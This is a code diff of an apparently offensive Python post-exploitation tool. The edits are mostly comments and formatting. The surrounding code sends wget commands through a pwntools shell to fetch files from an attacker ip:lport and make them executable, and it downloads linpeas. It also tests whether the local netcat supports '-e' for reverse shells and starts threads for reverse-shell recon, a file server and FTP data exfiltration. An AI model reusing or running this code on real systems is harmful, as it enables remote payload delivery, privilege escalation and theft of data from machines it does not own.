@@ -21,7 +21,6 @@ def parse_args():
     return args
 
 
-
 def get_file(tmp_dir, ip, lport, p, filename):
     p.sendline(f"wget http://{ip}:{lport}/www/{filename} -O {tmp_dir}/{filename}".encode())
     p.sendline(f"chmod +x {tmp_dir}/{filename}".encode())
@@ -86,7 +85,6 @@ def checks(args):
         else:
             print(f"FTP Server will run on port {args.dport}")
 
-
     # Check if linpeas is present
     if os.path.exists("./www/linpeas.sh"):
         print("The file exists")
@@ -94,7 +92,8 @@ def checks(args):
     else:
         print("The file doesn't exist on the local machine")
         # Prompt the user to download the file
-        download = input("Do you want to download the file? /!\ Might be outdated /!\ (y/n): ")
+        download = input("Do you want to download the file? "
+                         "/!\\ Might be outdated /!\\ (y/n): ")
         if download == "y":
             # Download the file
             os.system("wget https://github.com/carlospolop/PEASS-ng/releases/download/20230219/linpeas.sh -O ./www/linpeas.sh")
@@ -107,11 +106,14 @@ def checks(args):
             else:
                 return False
 
-    # Check if correct nc is present
+    # Check if correct nc is present if not copy it and check if it is compatible
     if os.path.exists("./www/nc"):
         print("The nc is in the www folder")
+        # Nc is present compatability is not checked!
         return True
+
     else:
+        # Check if the nc version is compatible
         p = process("/bin/bash")
         p.sendline("nc -e".encode())
         needle = "invalid option"
@@ -123,6 +125,7 @@ def checks(args):
             # Kill the process
             p.kill()
             return False
+
         else:
             print("The nc version is compatible")
             # cppy the nc to the www folder
@@ -130,6 +133,7 @@ def checks(args):
             return True
 
 
+# Function to start the ftp server if -d is used
 def data_exfiltration(dport):
     p = process("/bin/bash")
     print("Starting the ftp server...")
@@ -141,12 +145,10 @@ def main():
     # Parse the arguments
     args = parse_args()
 
-
-    # Check if linpeas is present
+    # Check if the arguments are correct
     if not checks(args):
         print("Exiting...")
         exit()
-
 
     # Create a temporary directory
     tmp_dir = "/tmp/" + "".join(random.choices(string.ascii_uppercase + string.digits, k=10))
@@ -166,7 +168,7 @@ def main():
     threading.Thread(target=reverse_shell_recon, args=(tmp_dir, port, current_os, lport, ip, mport)).start()
     # 2. Spawn the file server thread
     threading.Thread(target=file_server, args=(lport,)).start()
-    # 3. Spawn the data exfiltration thread
+    # 3. Spawn the data exfiltration thread if -d is used
     if args.dport:
         threading.Thread(target=data_exfiltration, args=(args.dport,)).start()
 
